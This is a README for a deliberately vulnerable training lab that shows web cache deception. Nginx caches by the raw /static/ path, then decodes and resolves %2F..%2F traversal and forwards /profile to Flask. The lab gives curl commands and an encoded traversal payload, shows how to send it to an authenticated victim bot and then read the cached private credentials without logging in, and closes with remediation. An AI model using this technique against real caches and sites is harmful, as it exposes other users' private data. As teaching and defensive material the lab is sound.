# Lab 03: Web Cache Deception via Path Traversal & Static Directory Normalization

## Scenario Overview
In this lab, **Nginx** is deployed as an edge reverse-proxy cache in front of a Python **Flask** web application.
The proxy is configured to cache any asset residing within the `/static/` directory to accelerate static file delivery (such as CSS, JavaScript, and images). The backend application serves dynamic authenticated user endpoints, including a sensitive executive dashboard at `/profile` containing private infrastructure credentials and flags.

An automated audit bot simulates an internal director (**Dr. Alex Mercer**) reviewing submitted links while authenticated with administrative session cookies.

---

## Technical Background & PortSwigger Research Alignment
This laboratory models the real-world **Web Cache Deception (WCD)** vulnerabilities discovered by Martin Doyhenard and PortSwigger research, specifically focusing on **Path Traversal & Delimiter Normalization Discrepancies**.

In real-world CDN and reverse-proxy architectures, caches frequently apply caching rules based on path prefixes (e.g., `/static/`, `/assets/`, `/public/`). When the caching proxy and the upstream backend differ in how they decode percent-encoded delimiters (like `%2f` or `%2F`) and how they resolve relative dot segments (`..`), an attacker can craft a path traversal payload that trick the cache into storing private dynamic responses under what appears to be a public static directory.

---

## Architectural Iteration History: Engineering Challenges & Technical Discoveries

Developing this laboratory involved navigating five distinct technical iterations, uncovering fundamental C-level behaviors in Nginx URI normalization, upstream proxying grammar, cache key collision traps, and client-side HTTP canonicalization.

### Iteration 1: The Semicolon Delimiter & Regex `proxy_pass` URI Limitation
* **Initial Concept**: Model a "double-lock" cache deception scenario where Nginx uses a regex location to cache static assets ending in `.css`:
  ```nginx
  location ~* ^/static/.*\.css$ {
      proxy_pass http://backend_app/;
      ...
  }
  ```
  with Flask middleware stripping matrix parameter delimiters (`;`).
* **The Blocker**: Nginx immediately failed to start with a configuration parse error:
  ```text
  nginx: [emerg] "proxy_pass" cannot have URI part in location given by regular expression, 
  or inside named location, or inside "if" statement, or inside "limit_except" block
  ```
* **C-Level Insight**: According to the Nginx HTTP Proxy Module specification (`ngx_http_proxy_module.c`), Nginx cannot determine where the URI substitution begins or ends when a location is matched via regular expression. Therefore, passing a URI part (such as the trailing slash `/`) is strictly prohibited inside regex location blocks unless variables are manually concatenated.

---

### Iteration 2: Prefix Location `/static/` with Trailing Slash & Static Asset 404s
* **Concept**: To allow URI replacement while keeping `/static/`, we transitioned to a prefix location:
  ```nginx
  location /static/ {
      proxy_pass http://backend_app/;
      proxy_cache lab_cache;
  }
  ```
* **The Blocker**: Legitimate static assets (e.g., `/static/style.css`) returned `HTTP 404 Not Found`.
* **C-Level Insight**: When `proxy_pass` has a URI part (even a single trailing slash `/`), Nginx replaces the portion of the request URI matching the `location` directive (`/static/`) with the URI specified in `proxy_pass` (`/`).
  - Client request: `GET /static/style.css`
  - Matched prefix: `/static/`
  - Replacement: `/`
  - Forwarded upstream: `GET /style.css`
  - Flask default static routing expects `GET /static/style.css`. Because Flask received `GET /style.css`, it had no corresponding route and returned 404.

---

### Iteration 3: Root Location `/` with Map on `.css` & Encoded Delimiter Re-encoding
* **Concept**: Place `proxy_pass http://backend_app/;` in the root `location /` and use an Nginx `map` on `$uri` to flag `.css` files for caching.
  - Client request: `GET /static/style.css` &rarr; replaced `/` with `/` &rarr; forwarded as `GET /static/style.css` (200 OK).
* **Delimiter Discovery (`%23` vs `%2f`)**:
  - We analyzed how Nginx processes percent-encoded characters:
    - **`%2f` (`/`)**: Nginx natively decodes `%2f` into `/` in `$uri` and normalizes relative `..` segments.
    - **`%23` (`#`)**: Nginx decodes `%23` into `#` in its internal `$uri`. However, when proxying to an upstream HTTP server with a trailing-slash `proxy_pass`, Nginx must comply with RFC 7230 request-line grammar (which forbids raw `#` in HTTP request lines). Nginx's C-routine automatically **re-encodes `#` back to `%23`** before transmitting the request to upstream Flask.
    - Flask treats literal `%23` as a regular character in path matching, causing dynamic route mismatches (404) unless special middleware decodes and splits it.

---

### Iteration 4: Pure Static Folder Traversal & The `$uri` Cache Collision Catastrophe
* **Concept**: Eliminate artificial matrix delimiters and custom middleware, modeling pure path-based caching using standard Nginx configuration and vanilla Flask:
  ```nginx
  map $request_uri $bypass_cache {
      ~*^/static/ 0;  # cache enabled
      default     1;  # cache bypassed
  }

  location / {
      proxy_pass http://backend_app/;
      proxy_cache_key "$request_method$uri";
  }
  ```
* **The Blocker (Cache Collision Trap)**:
  - During testing, submitting poisoned URLs to the victim bot resulted in the bot receiving the **attacker's profile** or failing to cache the victim's data!
* **Deep Diagnostic**:
  - Using `$uri` in `proxy_cache_key` collapses all normalized traversals into a single key:
    - Attacker tests: `/static/token_123/..%2f..%2fprofile` &rarr; `$uri` normalizes to `/profile` &rarr; Key: `GET/profile`.
    - If the attacker visits this while logged in, the cache stores the **attacker's session** under `GET/profile`.
    - When the victim bot subsequently visited the link, Nginx calculated the cache key `GET/profile`, saw a cache `HIT`, and served the attacker's data back to the victim! The request was never proxied upstream to Flask, and the victim's credentials were never cached.
    - Appending query strings (e.g. `?url=123`) did not resolve the collision because `$uri` excludes query strings!

---

### Iteration 5 (Final Working Architecture): Decoupled Cache Key & Raw Bot Sockets
To solve the collision issue and make the lab robust and realistic:
1. **Decoupled Cache Key via `$request_uri`**:
   ```nginx
   proxy_cache_key "$request_method$request_uri";
   ```
   `$request_uri` contains the complete, un-normalized request path as received from the client. By generating a unique token in the static path (e.g. `/static/a8f2bc01/..%2F..%2Fprofile`), each exploitation attempt gets a completely isolated, collision-free cache key.
2. **Client-Side Normalization in Python `requests`**:
   - When the bot visited URLs using `requests.Session().get()`, Python's `requests`/`urllib3` library automatically normalized literal `/../` segments on the client side before sending the packet over the wire, transmitting `GET /profile` instead of the traversal payload.
   - Additionally, `requests` canonicalized `%2f` into uppercase `%2F`, causing potential cache key case mismatches.
3. **The Solution in `bot.py`**:
   - Replaced high-level `requests` calls with Python's standard `http.client.HTTPConnection`. This sends raw byte paths over the TCP socket verbatim, preserving `%2f` and relative segments without client-side interference.

---

## The Vulnerability Explained

### Path Normalization Comparison Matrix

| Target Variable | Raw Incoming Request | Normalization / Parsing | Forwarded Upstream / Evaluated |
| :--- | :--- | :--- | :--- |
| **`$request_uri`** (Nginx Cache Rule) | `/static/e8b1/..%2F..%2Fprofile` | **Raw / Un-normalized** | Starts with `/static/` &rarr; **Cache Enabled (`$bypass_cache = 0`)** |
| **`$uri`** (Nginx Proxy Pass) | `/static/e8b1/..%2F..%2Fprofile` | Decodes `%2F` &rarr; `/`<br>Resolves `..` &rarr; `/profile` | `proxy_pass http://backend_app/;` forwards **`GET /profile`** |
| **Flask Route** | `GET /profile` | Standard routing | Executes `@app.route('/profile')` with victim's session |
| **`proxy_cache_key`** | `"$request_method$request_uri"` | Preserves unique token | Stored under `GET/static/e8b1/..%2F..%2Fprofile` |

### Step-by-Step Attack Flow

```
Attacker                               Victim (Bot)                             Nginx Cache                                  Flask Backend
   |                                        |                                        |                                             |
   |-- 1. Craft payload ------------------>|                                        |                                             |
   |   /static/TOKEN/..%2F..%2Fprofile      |                                        |                                             |
   |                                        |-- 2. GET /static/TOKEN/..%2F..%2Fprofile|                                            |
   |                                        |      (with Director session cookies)   |                                             |
   |                                        |                                        |-- 3. Cache Decision: $request_uri starts    |
   |                                        |                                        |      with /static/ -> CACHE = YES           |
   |                                        |                                        |-- 4. Normalization: %2F -> / & .. resolved  |
   |                                        |                                        |      $uri becomes /profile                  |
   |                                        |                                        |-- 5. Forward normalized GET /profile ------>|
   |                                        |                                        |                                             |-- 6. Render profile
   |                                        |                                        |<-- 7. 200 OK (with Flag & API Key) ---------|
   |                                        |<-- 8. 200 OK (X-Cache-Status: MISS) ---|
   |                                        |      (Cached under $request_uri)       |
   |                                                                                 |
   |-- 9. Unauthenticated GET /static/TOKEN/..%2F..%2Fprofile ----------------------->|
   |<-- 10. 200 OK (X-Cache-Status: HIT) -------------------------------------------|
   |    (Leaks Dr. Alex Mercer's private API key & FLAG!)
```

---

## Lab Architecture & Ports

| Service | Container Name | Internal Port | Host Port | Role |
| :--- | :--- | :--- | :--- | :--- |
| **Reverse Proxy** | `wcd03-cache` | 80 | **8081** | Nginx with path-based caching rule |
| **Web Application** | `wcd03-app` | 5000 | N/A | Python Flask backend (dynamic profiles) |
| **Audit Bot** | `wcd03-bot` | 5001 | N/A | Simulates authenticated victim visits |

---

## Exploitation Guide

### Option 1: Automated Verification
Run the automated exploit verification test:
```bash
make test LAB=wcd-03
```
Or directly using Python:
```bash
python labs/01-web-cache-deception/wcd-03-path-traversal-delimiter/exploit.py --url http://127.0.0.1:8081
```

### Option 2: Manual Exploitation via Curl

1. **Verify Static Asset Caching**:
   ```bash
   curl -i http://127.0.0.1:8081/static/style.css
   curl -i http://127.0.0.1:8081/static/style.css
   ```
   *Observe `X-Cache-Status: HIT` on the second request.*

2. **Verify Dynamic Endpoint Bypass**:
   ```bash
   curl -i http://127.0.0.1:8081/profile
   ```
   *Observe `X-Cache-Status: BYPASS`.*

3. **Craft a Unique Traversal Payload**:
   Generate a random token (e.g. `audit99`) to prevent collision:
   ```text
   http://127.0.0.1:8081/static/audit99/..%2F..%2Fprofile
   ```

4. **Submit to the Victim Bot**:
   Submit the URL via the report form at `http://127.0.0.1:8081/report` or using `curl`:
   ```bash
   curl -s -X POST http://127.0.0.1:8081/report -d "url=http://127.0.0.1:8081/static/audit99/..%2F..%2Fprofile"
   ```

5. **Harvest Cached Credentials (Unauthenticated)**:
   ```bash
   curl -i "http://127.0.0.1:8081/static/audit99/..%2F..%2Fprofile"
   ```
   *Note: If testing literal dot segments (`/static/audit99/../../profile`), pass `--path-as-is` to curl so curl does not normalize the path locally!*

   **Expected Output**:
   ```http
   HTTP/1.1 200 OK
   Server: nginx/1.25.5
   X-Cache-Status: HIT
   X-Lab-Mode: Vulnerable

   ...
   <h3>Dr. Alex Mercer</h3>
   <p>API Key: <code>sk-live-vault-mercer-9938210948ab12e8</code></p>
   <p>Flag: <code>FLAG{wcd_d0ubl3_l0ck_tr4v3rs4l_c4ch3_p0wn}</code></p>
   ```

---

## Remediation (Secure Mode)

To eliminate Web Cache Deception via Path Traversal:

1. **Strict Prefix Routing Without Global Normalization Bypass**:
   Route static requests only through dedicated prefix location blocks without rewriting or passing normalized root paths:
   ```nginx
   location /static/ {
       proxy_pass http://backend_app;
       proxy_cache lab_cache;
   }
   location / {
       proxy_pass http://backend_app;
       # No caching for dynamic routes
   }
   ```
2. **Never Override Upstream Cache-Control**:
   Remove `proxy_ignore_headers Cache-Control Expires Set-Cookie Vary;` so that reverse proxies honor upstream `Cache-Control: no-store, private` directives emitted by Flask on sensitive pages.

### Testing Secure Mode
1. Change the mode in `.env`:
   ```env
   MODE=secure
   ```
2. Re-deploy the lab:
   ```bash
   make up LAB=wcd-03
   ```
3. Run the verification test:
   ```bash
   make test LAB=wcd-03
   ```
   *The exploit will confirm that private victim data is blocked and never cached.*
